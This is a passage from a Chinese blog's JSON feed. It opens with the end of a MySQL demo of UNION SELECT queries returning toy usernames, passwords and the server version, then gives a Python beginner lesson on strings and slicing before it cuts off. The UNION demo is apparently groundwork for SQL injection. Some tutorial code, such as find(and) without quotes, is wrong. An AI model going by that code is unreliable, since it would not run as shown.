<span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"305\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span>  <span class=\"token number\">2931023</span> <span class=\"token operator\">|</span> admin123<span class=\"token variable\">@.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"306\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"307\"></td><td><pre><span class=\"token number\">5</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"308\"></td><td><pre></pre></td></tr><tr><td data-num=\"309\"></td><td><pre>当然也是可以这样</pre></td></tr><tr><td data-num=\"310\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> naid<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> nasa<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"311\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+-----------+</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username    <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+-----------+</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin       <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root        <span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar        <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer     <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin       <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> admin123    <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>    <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> ad65123     <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>    <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> ad6rewt5123 <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>    <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> wet34t5123  <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>    <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+-----------+</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre></pre></td></tr><tr><td data-num=\"325\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> naid<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> nasa <span class=\"token keyword\">limit</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"326\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+----------+</span></pre></td></tr><tr><td data-num=\"327\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username    <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"328\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+----------+</span></pre></td></tr><tr><td data-num=\"329\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer     <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"330\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> admin       <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> admin123    <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>   <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> ad65123     <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>   <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> ad6rewt5123 <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>   <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> wet34t5123  <span class=\"token operator\">|</span> <span class=\"token number\">8.0</span><span class=\"token number\">.32</span>   <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+-------------+----------+</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre><span class=\"token number\">6</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/01/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/",
            "url": "http://gyzero.shop/2023/11/01/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%97%E8%A1%A8-%E5%85%83%E7%BB%84-%E5%AD%97%E5%85%B8/",
            "title": "字符串,列表,元组,字典",
            "date_published": "2023-11-01T08:46:07.000Z",
            "content_html": "<h3 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> <strong><span class=\"label success\">字符串</span></strong></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>如下定义的变量a，存储的是数字类型的值</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">12345</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>如下定义的变量b，存储的是字符串类型的值</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">\"jfaolidshuioweah\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>v <span class=\"token operator\">=</span> <span class=\"token string\">\"你好\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>双引号或者单引号中的数据，就是字符串</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>字符串的输出<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">'czxy'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>position <span class=\"token operator\">=</span> <span class=\"token string\">'哈哈哈'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>address <span class=\"token operator\">=</span> <span class=\"token string\">'啦啦啦'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"姓名：%s\"</span> <span class=\"token operator\">%</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"职位：%s\"</span> <span class=\"token operator\">%</span> position<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"公司地址：%s\"</span> <span class=\"token operator\">%</span> address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>字符串的输入</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>之前在学习<span class=\"token builtin\">input</span>的时候，通过它能够完成从键盘获取数据，然后保存到指定的变量中；</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>注意：<span class=\"token builtin\">input</span>获取的数据，都以字符串的方式进行保存，即使输入的是数字，那么也是</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>以字符串方式保存</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>userName <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入用户名:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户名为：%s\"</span> <span class=\"token operator\">%</span> userName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>password <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入密码:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"密码为：%s\"</span> <span class=\"token operator\">%</span> password<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"下标切片\"><a class=\"markdownIt-Anchor\" href=\"#下标切片\">#</a> <strong><span class=\"label success\">下标切片</span></strong></h4>\n<p>所谓 “下标”，就是编号，就好比快递存储柜的编号，通过这个编号就能找到相应的存储空间字符串中 &quot;下标&quot; 的使用</p>\n<p><strong>列表与元组支持下标索引好理解，字符串实际上就是字符的数组，所以也支持下标索引。</strong></p>\n<p>如果有字符串:name = ‘abcdef’，在内存中的实际存储如下:</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/2.png\" alt=\"\"></p>\n<p>如果想取出部分字符，那么可以通过下标的方法，（注意 python 中下标从 0 开始）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"python\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>切片是指对操作的对象截取其中一部分的操作。<strong>字符串、列表、元组</strong>都支持切片操作。</p>\n<h5 id=\"切片的语法起始结束步长\"><a class=\"markdownIt-Anchor\" href=\"#切片的语法起始结束步长\">#</a> 切片的语法：<span class=\"label success\">起始：结束：步长</span></h5>\n<div class=\"note info\">\n<p>注意：选取的区间从 &quot;起始&quot; 位开始，到 &quot;结束&quot; 位的前一位结束（不包含结束位本身)，步长表示选取间隔。</p>\n</div>\n<p>以字符串为例。</p>\n<p>如果取出一部分，则可以在中括号 [] 中，使用:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">'python'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取 下标 0~2 的字符</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pyt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"python\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 取 下标 1~4 的字符</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>结果<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>ytho</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>不包含第五位n</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">'abcdef'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取全部</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#起始位下标不写 从最左侧开始获取</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#结束位下标不写 一直获取到最后</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 步长是正数 从左向右取  注意起始下标和结束下标也要从左向右</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 步长是负数 从右向左取  注意起始下标和结束下标也要从右向左</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>想一想</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    （面试题）给定一个字符串aStr<span class=\"token punctuation\">,</span> 请反转字符串</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 索引是通过下标取某一个元素</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 切片是通过下标去某一段元素</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">'Hello World!'</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> <span class=\"token comment\"># 取出所有元素（没有起始位和结束位之分），默认步长为 1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre> <span class=\"token comment\"># 从下标为 1 开始，取出 后面所有的元素（没有结束位）</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre> <span class=\"token comment\"># 从起始位置开始，取到 下标为 5 的前一个元素</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre> <span class=\"token comment\"># 从起始位置开始，取到 倒数第 2 个元素</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre> <span class=\"token comment\"># 从倒数第 4 个元素开始，取到 倒数第 2 个元素</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre> <span class=\"token comment\"># 从下标为 1 开始，取到下标为 5 的前一个元素，步长为 2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># python 字符串快速逆置</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 从后向前，按步长为 1 进行取值</span></pre></td></tr></table></figure><h4 id=\"字符串常见操作\"><a class=\"markdownIt-Anchor\" href=\"#字符串常见操作\">#</a> <span class=\"label success\">字符串常见操作</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>如有字符串mystr <span class=\"token operator\">=</span> <span class=\"token string\">'hello world itcast and itcastcpp'</span>，以下是常见的操作</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>find</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>检测 <span class=\"token builtin\">str</span> 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>定范围内，如果包含返回开始的索引值，否则返回<span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mystr<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> start<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>mystr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 方法介绍</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mystr <span class=\"token operator\">=</span> <span class=\"token string\">'hello world itcast and itcastcpp'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>demo <span class=\"token operator\">=</span>  mystr<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token keyword\">and</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>demo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>结果<span class=\"token punctuation\">:</span><span class=\"token number\">19</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>demo <span class=\"token operator\">=</span> mystr<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token keyword\">and</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>demo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>结果<span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rfind</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>类似于 find<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数，不过是从右边开始查找<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token 